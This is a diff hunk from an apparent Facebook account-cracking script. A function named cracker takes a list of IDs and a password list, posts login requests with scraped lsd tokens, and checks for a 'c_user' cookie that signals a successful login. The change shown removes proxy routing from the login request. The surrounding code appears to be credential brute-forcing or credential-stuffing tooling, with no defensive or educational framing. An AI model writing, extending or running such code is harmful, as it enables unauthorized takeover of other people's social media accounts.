@@ -185,7 +185,7 @@ def cracker(ids,passlist):
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream',}                        
-            response = session.post(url,headers=head,data=log_data,proxies=proxs,allow_redirects=False) #proxies=proxs)
+            response = session.post(url,headers=head,data=log_data,allow_redirects=False) #proxies=proxs)
             #print(headers)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
